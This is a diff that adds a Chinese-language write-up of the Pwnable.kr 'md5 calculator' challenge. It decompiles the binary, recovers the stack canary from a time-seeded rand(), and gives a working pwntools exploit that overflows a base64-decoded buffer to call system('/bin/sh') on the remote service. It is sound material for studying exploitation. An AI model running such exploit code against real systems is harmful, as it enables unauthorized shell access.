@@ -12898,6 +12898,189 @@ io.interactive()
 
 ------
 
+### md5 calculator
+
+这是**Pwnable.kr**的第二十三个挑战`md5 calculator`，来自**[Rookiss]**部分。
+
+```bash
+We made a simple MD5 calculator as a network service.
+Find a bug and exploit it to get a shell.
+
+Download : http://pwnable.kr/bin/hash
+hint : this service shares the same machine with pwnable.kr web service
+
+Running at : nc pwnable.kr 9002
+```
+
+先把二进制文件`hash`下载并查看文件信息。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ wget http://pwnable.kr/bin/hash
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ sudo chmod +x ./hash
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ file ./hash     
+./hash: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=89ebf47881a82f5a991199ae381f8284a46e0500, not stripped
+                                                                                                      
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ checksec --file=./hash     
+[*] '/home/tyd/ctf/pwn/pwnable.kr/hash'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+使用`IDA pro 32bit`打开附件`hash `，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  unsigned int v3; // eax
+  int v5; // [esp+18h] [ebp-8h] BYREF
+  int v6; // [esp+1Ch] [ebp-4h]
+
+  setvbuf(stdout, 0, 1, 0);
+  setvbuf(stdin, 0, 1, 0);
+  puts("- Welcome to the free MD5 calculating service -");
+  v3 = time(0);
+  srand(v3);
+  v6 = my_hash();
+  printf("Are you human? input captcha : %d\n", v6);
+  __isoc99_scanf("%d", &v5);
+  if ( v6 != v5 )
+  {
+    puts("wrong captcha!");
+    exit(0);
+  }
+  puts("Welcome! you are authenticated.");
+  puts("Encode your data with BASE64 then paste me!");
+  process_hash();
+  puts("Thank you for using our service.");
+  system("echo `date` >> log");
+  return 0;
+}
+```
+
+挺有意思的，看完程序的大致逻辑之后，`nc`进去走个流程：先输入`captcha`，然后输入一个`base64`加密的数据，程序将输出一个`MD5`值。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ nc pwnable.kr 9002
+- Welcome to the free MD5 calculating service -
+Are you human? input captcha : -651314993
+-651314993
+Welcome! you are authenticated.
+Encode your data with BASE64 then paste me!
+LTY1MTMxNDk5Mw==
+MD5(data) : b3fd6020a1745ce75c30fb2363f7bbca
+Thank you for using our service.
+```
+
+双击`my_hash()`函数查看详情：
+
+```c
+int my_hash()
+{
+  int i; // [esp+0h] [ebp-38h]
+  char v2[4]; // [esp+Ch] [ebp-2Ch]
+  int v3; // [esp+10h] [ebp-28h]
+  int v4; // [esp+14h] [ebp-24h]
+  int v5; // [esp+18h] [ebp-20h]
+  int v6; // [esp+1Ch] [ebp-1Ch]
+  int v7; // [esp+20h] [ebp-18h]
+  int v8; // [esp+24h] [ebp-14h]
+  int v9; // [esp+28h] [ebp-10h]
+  unsigned int v10; // [esp+2Ch] [ebp-Ch]
+
+  v10 = __readgsdword(0x14u);
+  for ( i = 0; i <= 7; ++i )
+    *(_DWORD *)&v2[4 * i] = rand();
+  return v6 - v8 + v9 + v10 + v4 - v5 + v3 + v7;   // 返回captcha
+}
+```
+
+我们可以利用`C`语言中生成伪随机数的方式来计算出`canary`。
+
+```python
+import ctypes
+from pwn import *
+
+libc = ctypes.CDLL('libc.so.6')
+seed = int(libc.time(0))
+
+io = remote('pwnable.kr', 9002)
+io.recvuntil(b'Are you human? input captcha : ')
+captcha = int(io.recvline()[:-1])
+log.success('captcha => %d', captcha)
+io.sendline(str(captcha).encode())
+rands = [libc.rand() for _ in range(8)]
+canary = (captcha-rands[4]+rands[6]-rands[7]-rands[2]+rands[3]-rands[1]-rands[5]) & 0xffffffff
+log.success('canary => %#x', canary)
+```
+
+接着来看`process_hash()`函数，`fget`函数最多读取1024字节到`.bss`段上的变量`g_buf`，随后利用`Base64Decode`函数进行`Base64`解码，然后将返回值放入`calc_md5`进行`MD5`加密。而`v3`存在栈溢出漏洞，构造`payload`时可以先用`0x200`个字节的`padding`进行填充，写入`canary`后再用`12`个字节覆盖到栈帧，接着写入`call_system`进行系统调用。我们可以把`payload`写入到`.bss`段上，然后进行`base64`加密，最后加上`"/bin/sh"`获得`shell`脚本。
+
+```c
+unsigned int process_hash()
+{
+  int v1; // [esp+14h] [ebp-214h]
+  char *ptr; // [esp+18h] [ebp-210h]
+  char v3[512]; // [esp+1Ch] [ebp-20Ch] BYREF
+  unsigned int v4; // [esp+21Ch] [ebp-Ch]
+
+  v4 = __readgsdword(0x14u);
+  memset(v3, 0, sizeof(v3));
+  while ( getchar() != 10 )
+    ;
+  memset(g_buf, 0, sizeof(g_buf));
+  fgets(g_buf, 1024, stdin);
+  memset(v3, 0, sizeof(v3));
+  v1 = Base64Decode(g_buf, v3);
+  ptr = (char *)calc_md5(v3, v1);
+  printf("MD5(data) : %s\n", ptr);
+  free(ptr);
+  return __readgsdword(0x14u) ^ v4;
+}
+```
+
+编写`Python`代码求解，拿到`Shell`后输入`cat flag`得到`flag`。
+
+提交`Canary, Stack guard, Stack protector.. what is the correct expression?`即可。
+
+```python
+import ctypes
+from pwn import *
+
+libc = ctypes.CDLL('libc.so.6')
+# libc = ctypes.cdll.LoadLibrary('libc.so.6')
+io = remote('pwnable.kr', 9002)
+libc.srand(libc.time(0))
+io.recvuntil(b'Are you human? input captcha : ')
+captcha = int(io.recvline()[:-1])
+log.success('captcha => %d', captcha)
+io.sendline(str(captcha).encode())
+rands = [libc.rand() for _ in range(8)]
+canary = (captcha-rands[4]+rands[6]-rands[7]-rands[2]+rands[3]-rands[1]-rands[5]) & 0xffffffff
+log.success('canary => %#x', canary)
+call_system = 0x8049187
+g_buf = 0x804B0E0  # .bss
+process_hash = 0x8048f92
+payload = cyclic(0x200) + p32(canary) + cyclic(0xc) + p32(call_system)
+payload += p32(g_buf + len(b64e(payload))+4)
+payload = b64e(payload).encode()
+payload += b'/bin/sh\x00'
+io.recvuntil(b'Encode your data with BASE64 then paste me!\n')
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
 ### simple login
 
 这是**Pwnable.kr**的第二十四个挑战`simple login`，来自**[Rookiss]**部分。
@@ -13157,4 +13340,6 @@ control EBP, control ESP, control EIP, control the world~
 ```
 
 ------
+
+
 
